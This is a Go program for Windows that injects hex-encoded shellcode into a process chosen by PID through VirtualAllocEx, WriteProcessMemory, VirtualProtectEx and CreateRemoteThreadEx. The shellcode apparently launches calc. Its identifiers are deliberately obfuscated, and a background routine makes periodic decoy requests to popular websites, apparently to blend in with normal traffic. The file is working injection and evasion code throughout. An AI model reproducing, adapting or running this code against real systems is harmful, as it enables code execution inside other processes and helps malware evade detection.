package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	x1c3d4e5f := flag.Bool("verbose", false, "Enable verbose output")
	x2a3b4c5d := flag.Bool("debug", false, "Enable debug output")
	x3e4f5g6h := flag.Int("pid", 0, "Process ID to inject shellcode into")
	flag.Parse()

	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for {
			<-ticker.C
			go func() {
				if err := sendRequests(); err != nil {
					log.Printf("Error sending requests: %v", err)
				}
			}()
			time.Sleep(2 * time.Minute)
			go func() {
				if err := sendRequests(); err != nil {
					log.Printf("Error sending requests: %v", err)
				}
			}()
			time.Sleep(2 * time.Minute)
			go func() {
				if err := sendRequests(); err != nil {
					log.Printf("Error sending requests: %v", err)
				}
			}()
		}
	}()

	x2d3e4f5g()
}

func x2d3e4f5g() {
	x6a7b8c9d, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	x9eafb0b1 := windows.NewLazySystemDLL("kernel32.dll")

	x7f8fa0b2 := x9eafb0b1.NewProc("VirtualAllocEx")
	x9c0d1e2f := x9eafb0b1.NewProc("VirtualProtectEx")
	xc3d4e5f6 := x9eafb0b1.NewProc("WriteProcessMemory")
	xb2c3d4e5 := x9eafb0b1.NewProc("CreateRemoteThreadEx")

	if *x2a3b4c5d {
		fmt.Printf("[DEBUG] Getting a handle to Process ID (PID) %d...\n", *x3e4f5g6h)
	}
	x12e3f4g5, _ := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*x3e4f5g6h))

	if *x1c3d4e5f {
		fmt.Printf("[-] Successfully got a handle to process %d\n", *x3e4f5g6h)
	}

	if *x2a3b4c5d {
		fmt.Printf("[DEBUG] Calling VirtualAllocEx on PID %d...\n", *x3e4f5g6h)
	}
	x8a9b0c1d, _, _ := x7f8fa0b2.Call(uintptr(x12e3f4g5), 0, uintptr(len(x6a7b8c9d)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if x8a9b0c1d == 0 {
		log.Fatal("[-]VirtualAllocEx failed and returned 0")
	}
	if *x1c3d4e5f {
		fmt.Printf("[-] Successfully allocated memory in PID %d\n", *x3e4f5g6h)
	}

	if *x2a3b4c5d {
		fmt.Printf("[DEBUG] Calling WriteProcessMemory on PID %d...\n", *x3e4f5g6h)
	}
	_, _, _ = xc3d4e5f6.Call(uintptr(x12e3f4g5), x8a9b0c1d, (uintptr)(unsafe.Pointer(&x6a7b8c9d[0])), uintptr(len(x6a7b8c9d)))

	if *x1c3d4e5f {
		fmt.Printf("[-] Successfully wrote shellcode to PID %d\n", *x3e4f5g6h)
	}

	if *x2a3b4c5d {
		fmt.Printf("[DEBUG] Calling VirtualProtectEx on PID %d...\n", *x3e4f5g6h)
	}
	x4e5f6g7h := windows.PAGE_EXECUTE_READ
	_, _, _ = x9c0d1e2f.Call(uintptr(x12e3f4g5), x8a9b0c1d, uintptr(len(x6a7b8c9d)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&x4e5f6g7h)))

	if *x1c3d4e5f {
		fmt.Printf("[-] Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d\n", *x3e4f5g6h)
	}

	if *x2a3b4c5d {
		fmt.Printf("[DEBUG] Call CreateRemoteThreadEx on PID %d...\n", *x3e4f5g6h)
	}
	_, _, _ = xb2c3d4e5.Call(uintptr(x12e3f4g5), 0, 0, x8a9b0c1d, 0, 0, 0)

	if *x1c3d4e5f {
		fmt.Printf("[+] Successfully create a remote thread in PID %d\n", *x3e4f5g6h)
	}

	if *x2a3b4c5d {
		fmt.Printf("[DEBUG] Calling CloseHandle on PID %d...\n", *x3e4f5g6h)
	}
	windows.CloseHandle(x12e3f4g5)
	if *x1c3d4e5f {
		fmt.Printf("[-] Successfully closed the handle to PID %d\n", *x3e4f5g6h)
	}
}

func sendRequests() error {
	urls := []string{
		"https://www.apple.com/",
		"https://www.microsoft.com/",
		"https://www.amazon.com/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.google.com/",
		"https://www.twitter.com/",
		"https://www.instagram.com/",
		"https://www.linkedin.com/",
		"https://www.wikipedia.org/",
	}

	rand.Shuffle(len(urls), func(i, j int) {
		urls[i], urls[j] = urls[j], urls[i]
	})

	for i := 0; i < 3 && i < len(urls); i++ {
		resp, err := http.Get(urls[i])
		if err != nil {
			return err
		}
		resp.Body.Close()
	}
	return nil
}